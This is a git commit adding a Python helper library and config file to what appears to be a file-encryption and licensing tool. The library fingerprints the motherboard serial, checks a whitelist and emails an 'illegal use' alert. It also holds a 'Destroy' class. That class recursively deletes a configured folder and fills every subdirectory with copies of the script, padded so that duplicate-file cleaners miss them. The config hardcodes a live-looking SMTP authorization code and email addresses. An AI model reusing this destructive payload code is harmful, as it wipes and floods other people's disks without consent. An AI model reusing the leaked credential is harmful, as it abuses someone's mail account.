2c7b5b676e679baa9d5fac629d73a51c698ae3e0
zzg <32484502+zhaori@users.noreply.github.com>
2019-06-08 07:40:29 +0800

    Add files via upload

---
+++ lib/addedlib.py
@@ -0,0 +1,158 @@
+import hashlib
+import os
+import shutil
+import smtplib
+import time
+from email.mime.text import MIMEText
+
+import wmi
+from lxml import etree, objectify
+
+from lib import cryptlib
+from lib.config import email_id, \
+    email_port, email_to, email_pwd, \
+    email_from, content, subject, path
+
+
+class Attribute(object):
+    # 附加功能类
+    def __init__(self):
+        self.e_from = email_from
+        self.e_pwd = email_pwd
+        self.e_to = email_to
+        self.port = email_port
+        self.e_id = email_id
+
+    def emil_min(self):
+        # 邮件内容支持HTM格式
+        Email = MIMEText(content, "html", "utf-8")
+        Email['Subject'] = subject
+        Email['From'] = self.e_from
+        Email['To'] = self.e_to
+        try:
+            s = smtplib.SMTP_SSL(self.e_id, self.port)  # 邮件服务器及端口号
+            s.login(self.e_from, self.e_pwd)
+            s.sendmail(self.e_from, self.e_to, Email.as_string())
+            s.quit()
+        except:
+            print('发送失败！')
+
+    def BIOS_board(self):
+        # 获取BIOS和主板信息（特征码）并使用sha3作为哈希加密算法，请注意，sha1和MD5早已被破解请勿使用
+        w = wmi.WMI()
+        board = w.Win32_BaseBoard()
+        for i in board:
+            ha_ber = hashlib.sha3_256(str(i.SerialNumber).encode('utf8'))
+            br = ha_ber.hexdigest()
+            # snumber = uuid.uuid5(uuid.NAMESPACE_DNS, br)
+            return br
+
+    def control(self, path, name):
+        # 文件监控
+        # st_atime(访问时间), st_mtime(修改时间), st_ctime（创建时间)
+        suffer = os.path.join(path, name)
+        statinfo = os.stat(suffer)
+        ctime = time.strftime('%Y.%m.%d.%X', time.localtime(statinfo.st_ctime))
+        atime = time.strftime('%Y.%m.%d.%X', time.localtime(statinfo.st_atime))
+        mtime = time.strftime('%Y.%m.%d.%X', time.localtime(statinfo.st_mtime))
+        nowtime = time.strftime('%Y.%m.%d.%X', time.localtime(time.time()))
+        return {
+                '监控时间': nowtime,
+                '创建时间':ctime,
+                '访问时间':atime,
+                '修改时间':mtime
+                }
+
+class Destroy(object):
+    # 附加负面效果属性类,谨慎使用的类，易诱发不良后果，特别是第一个方法不是仇人就不要乱搞
+    def __init__(self):
+        self.del_path = path
+
+    def delfile(self):
+        # 递归删除文件夹及其文件方法，尽量不用，做事留余地
+        try:
+            file_li = os.listdir(self.del_path)
+            for i in file_li:
+                file_path = os.path.join(self.del_path, i)
+                if os.path.isfile(file_path):
+                    os.remove(file_path)
+                elif os.path.isdir(file_path):
+                    shutil.rmtree(file_path, True)
+        except PermissionError:
+            pass
+
+    def junk(self, ppach, max):
+        # 生成大量垃圾无用文件，ppach是指定父文件夹路径，max是生成数量最大值,
+        # 数值越大运行越慢，注意掌握好平衡，太恶心人了也要不得
+        file_li = []
+        for a, b, c in os.walk(ppach):
+            file_li.append(str(a))
+        for i in file_li:
+            f_path = os.path.join(ppach, i)
+            if os.path.isdir(f_path):
+                with open(__file__, 'r', encoding='utf-8') as f:
+                    a = f.read()
+                file_path = os.path.join(f_path, __file__)
+                name = os.path.basename(file_path)
+                (filename, listname) = os.path.splitext(name)
+                for i in range(1, int(max) + 1):
+                    file = os.path.join(f_path, filename + str(i) + listname)
+                    try:
+                        with open(file, 'w') as f:
+                            # 之所以添加换行主要是防止被清理垃圾软件的清理重复文件功能批量删除
+                            f.write(str(a) + '\n')
+                    except PermissionError:
+                        pass
+
+
+# 许可白名单,有且仅有保存在这个文件里的主板Id可用
+class Whitelists(object):
+
+    def __init__(self, xml_name):
+        self.name = xml_name  # 保存的xml文件名
+        self.tree = None  # 新建xml文件
+        self.xml = objectify.ElementMaker(annotate=False)
+
+    def new_xml(self, data):
+        self.tree = self.xml.writelists(
+            self.xml.data(data)
+        )
+        etree.ElementTree(self.tree).write(self.name, pretty_print=True)
+
+    def add_xml(self, data):
+        te = self.xml.data(data)
+        self.tree.append(te)
+        etree.ElementTree(self.tree).write(self.name, pretty_print=True)
+
+    def read_xml(self):
+        # 因为直接读取xml文件的值是元组类型，不能被修改，因此转换为列表
+        li = []  # 存入列表
+        tree = etree.parse(self.name)
+        for i in tree.xpath('//data'):
+            li.append(str(i.text))
+        return li
+
+
+# 新建一个上下文管理器，这里是有关处理数据库安全的措施，执行了一个打开关闭的动作（即解密再加密）
+class Operaction():
+
+    def __enter__(self):
+        return self
+
+    def open(self):
+        # 解密box.key和数据库
+        rsa = cryptlib.RSA()
+        rsa.decrypt('box.key')
+        db = cryptlib.enboxdb()
+        db.dedb()
+
+    def close(self):
+        # 加密box.key和数据库
+        db = cryptlib.enboxdb()
+        db.endb()
+        rsa = cryptlib.RSA()
+        rsa.encrypt('box.key')
+
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        return True
+# 113
---
+++ lib/config.py
@@ -0,0 +1,79 @@
+"""
+第三方库的第三方下载网址清华下载
+lib_url="https://pypi.tuna.tsinghua.edu.cn/simple"
+这是整个程序的配置文件，但有关数据库的配置部分，假如程序已经转换成可执行文件的话不建议修改
+邮件的内容可以自定义为html
+"""
+
+# 文件路径
+text_path = './box/'
+en_text_path = './entext/'
+de_text_path = './detext/'
+zip_path = './zip'
+
+# 随机AES密码，如有必要也可以自己创建box.key文件，里面存放你的密码
+# byes只能小于等于180
+byes = 180
+
+# 加密文件后是否删除源文件，0为删除，1为保留
+del_text = 1
+
+# 数据库建表
+sql_mode = """create table box(
+                id  text,
+                user text,
+                password text,
+                AESkey  text
+           )
+        """
+
+# 数据库的表名，必须和上面的sql_mode保持一致
+table_name = 'box'
+
+# 数据库保存路径
+db_path = r"./box.db"
+
+# 插入数据
+sql_data = """insert into box
+              (id, user, password, AESkey) 
+              values
+              (:id, :user, :password, :AESkey)"""
+
+# salt即盐值，可自定义
+# 数据库存储密码
+
+salt = "666666"
+
+# 邮箱配置参数信息
+# QQ接收邮件服务器：pop.qq.com,995
+# 发送邮件服务器：smtp.qq.com,465、587
+
+# 服务器地址
+email_id = "smtp.qq.com"
+
+# 服务器端口
+email_port = "465"
+
+# 发件邮箱
+email_from = "1471584500@qq.com"
+
+# 发件邮箱密码(授权码)不是邮箱密码,确保邮箱开启了对应的服务如POP3/SMTP、IMAP/SMTP
+#对应的介绍网页链接 https://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=331
+email_pwd = "pvqmzbeaaqcuhiee"
+
+# 收件邮箱
+email_to = "2134034899@qq.com"
+
+# 邮件主题
+subject = "安全提醒"
+
+# 邮件内容
+content = '''
+    <center>
+        <span style="font-size:30px;color:black">警告：程序非法使用</span>
+    </center>            
+'''
+
+# 删除目录
+path = r'D:/测试文件夹'
+#33
